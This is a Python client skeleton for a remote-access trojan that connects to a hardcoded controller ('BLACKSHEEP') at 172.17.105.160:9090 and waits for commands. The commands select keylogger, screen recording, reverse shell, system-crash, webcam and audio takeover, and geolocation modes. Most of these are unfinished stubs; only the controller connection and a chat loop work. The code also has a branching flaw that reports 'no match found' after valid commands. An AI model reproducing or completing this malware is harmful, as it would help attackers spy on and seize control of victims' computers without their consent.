from keyboard import *
import socket
from time import sleep
import pyautogui

class Client:
#client code starts here:
    def __init__(self):
        self.host = "172.17.105.160"
        self.port = 9090
        self.route = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def connection_to_server(self):
        try:
            self.route.connect((self.host, self.port))
            print("connection established: ")
            self.messaging()
        except ConnectionRefusedError as err:
            print("SORRY YOU CANNOT CONNECT TO THE BLACKSHEEP HOST")

        except KeyboardInterrupt:
            print("\n YOU CLOSED THE CONNECTION")
            self.route.close()
    
    def messaging(self):
        self.data_from_blacksheep = self.route.recv(1024).decode("utf-8")
        print(self.data_from_blacksheep)
        if self.data_from_blacksheep == "1":
            #screen recording goes here
            print("SCREENSHARE MODE ACTIVATED")
            self.screen_record()
        if self.data_from_blacksheep == "2":
            #keylogger codes goes here
            print("KEYLOGGER MODE ACTIVATED")
            self.keylogger()
        if self.data_from_blacksheep == "3":
            #screen reverse shell goes here
            print("REVERSE SHELL MODE ACTIVATED")
            self.reverse_shell()
        if self.data_from_blacksheep == "4":
            #crashing the entire systemclear
            print("MALWARE MODE ACTIVATED")

            self.crash_sys()
        if self.data_from_blacksheep == "5":
            #take over cameras and audio
            print("WEBCAM MODE ACTIVATED")
            self.webcam()
        if self.data_from_blacksheep == "6":
            #get the exact locations
            print("GEOLOCATION MODE ACTIVATED")
            self.geolocate()
        if self.data_from_blacksheep == "7":
            print("CHAT MODE ACTIVATED")
            #get the exact locations
            self.chat()
        if not self.data_from_blacksheep or self.data_from_blacksheep == "END":
            print("no code executed")
        else:
            print("no match found")

    def main(self):
        self.connection_to_server()
#client code ends here:


    #screen recording goes here
    def screen_record(self):
        print("more codes will go bellow")
        self.route.close()

    #keylogger codes goes here 
    def keylogger(self):
        print("more codes will go bellow")
        self.route.close()

    #screen reverse shell goes here
    def reverse_shell(self):
        print("more codes will go bellow")
        self.route.close()

    #crashing the entire system
    def crash_sys(self):
        print("more codes will go bellow")
        self.route.close()

    #take over cameras and audio
    def webcam(self):
        print("more codes will go bellow")
        self.route.close()

    #get the exact locations
    def geolocate(self):
        print("more codes will go bellow")
        self.route.close()

    def chat(self):
        while True:
            self.data_from_blacksheep = self.route.recv(1024).decode("utf-8")
            print(self.data_from_blacksheep)
            if not self.data_from_blacksheep or self.data_from_blacksheep == "END":
                #incase there is no data from blacksheep {self destruct}
                break

S = Client()
S.main()